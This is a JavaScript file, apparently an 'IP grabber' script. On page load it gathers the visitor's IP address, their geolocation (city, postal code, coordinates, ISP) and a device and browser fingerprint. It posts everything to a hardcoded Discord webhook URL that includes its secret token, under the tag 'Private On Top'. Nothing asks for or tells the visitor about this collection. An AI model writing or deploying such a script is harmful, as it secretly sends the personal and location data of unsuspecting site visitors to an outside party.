// Function to send system information to Discord
function sendToDiscord(message) {
    // Your Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1242187848166281297/upWJz-8smZmgQRzEkCEh-9hVWR2TI38qkHHv2zrH4JaqyfdKFhf-4aOEL0FVunI9f9Mh';

    // Construct the request body
    const requestBody = {
        content: message
    };

    // Make a POST request to the Discord webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed');
        }
        console.warn('Clear');
    })
    .catch(error => {
        console.error('Failed', error);
    });
}

// Function to get RAM information
function getSystemRAM() {
    const memory = navigator.deviceMemory;
    return memory ? `${memory} GB` : 'Unknown';
}

function getGraphicsCardName() {
    const gl = document.createElement('canvas').getContext('webgl');
    if (!gl) {
      return {
        error: "no webgl",
      };
    }
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? {
      graphicsCard: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
    } : {
      error: "no WEBGL_debug_renderer_info",
    };
  }

  const result = getGraphicsCardName();

  // Check if there's an error
  if (result.error) {
      // If there's an error, log it
      console.error(result.error);
  } else {
      // If there's no error, extract the graphics card information
      const graphicsCardInfo = result.graphicsCard;
      const graphicsCardName = graphicsCardInfo.name; // Adjust property name as needed
      console.log(`Graphics Card: ${graphicsCardName}`);
  }
  

// Function to get screen resolution
function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

// Function to get browser name
function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome')) {
        return 'Google Chrome';
    } else if (userAgent.includes('Firefox')) {
        return 'Mozilla Firefox';
    } else if (userAgent.includes('Edge')) {
        return 'Microsoft Edge';
    } else {
        return 'Unknown Browser';
    }
}




// Function to get browser version
function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const match = userAgent.match(/(Chrome|Firefox|Edge)\/([\d.]+)/);
    return match ? match[2] : 'Unknown';
}

// Function to get IP address information
function getIPAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP address:', error);
            return 'Unknown';
        });
}

// Function to fetch country information based on IP address
function getCountryInfo(ip) {
    return fetch(`https://ipapi.co/${ip}/json/`)
        .then(response => response.json())
        .catch(error => {
            console.error('Error fetching country information:', error);
            return {};
        });
}

// Function to get system information and display on the page
async function getSystemInfo() {
    try {
        // Get IP address
        const ip = await getIPAddress();

        // Get country information
        const countryInfo = await getCountryInfo(ip);

        // Construct message with system and country information
        const message = `**
        
IP Address: ${ip}\nCountry: ${countryInfo.country_name || 'Unknown'}\nRegion: ${countryInfo.region || 'Unknown'}\nCountry Code: ${countryInfo.country_code || 'Unknown'}\nContinent Code: ${countryInfo.continent_code || 'Unknown'}\nCity: ${countryInfo.city || 'Unknown'}\nZIP/Postal Code: ${countryInfo.postal || 'Unknown'}\nLatitude: ${countryInfo.latitude || 'Unknown'}\nLongitude: ${countryInfo.longitude || 'Unknown'}\nTimezone: ${countryInfo.timezone || 'Unknown'}\nISP: ${countryInfo.org || 'Unknown'}\nCurrency: ${countryInfo.currency || 'Unknown'}\n\nSystem Information:\nRAM: ${getSystemRAM()}\n GPU: ${result.error ? 'Unknown' : result.graphicsCard} \nScreen Resolution: ${getScreenResolution()}\nAvailable Screen Height: ${window.screen.availHeight}\nAvailable Screen Width: ${window.screen.availWidth}\nDevice Pixel Ratio: ${window.devicePixelRatio}\nConnection Type: ${navigator.connection ? navigator.connection.type : 'Not available'}\nHardware Concurrency: ${navigator.hardwareConcurrency || 'Not available'}\nBattery Level: ${navigator.getBattery ? (await navigator.getBattery()).level : 'Not available'}\nPlatform: ${navigator.platform}\nProduct: ${navigator.product}\nVendor: ${navigator.vendor}\n\nBrowser Information:\nBrowser: ${getBrowserName()}\nVersion: ${getBrowserVersion()}\nCookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\nLanguage: ${navigator.language}\nUser Agent: ${navigator.userAgent}\nDo Not Track: ${navigator.doNotTrack ? 'Yes' : 'No'}\n
:smiling_imp: Private On Top :smiling_imp:
        **`;

        // Send message to Discord
        sendToDiscord(message);

        // Display system and country information on the website
        const informationDiv = document.querySelector('.information');
        informationDiv.innerText = message;
    } catch (error) {
        console.error('Error getting system information:', error);
    }
}


window.addEventListener('load', getSystemInfo);






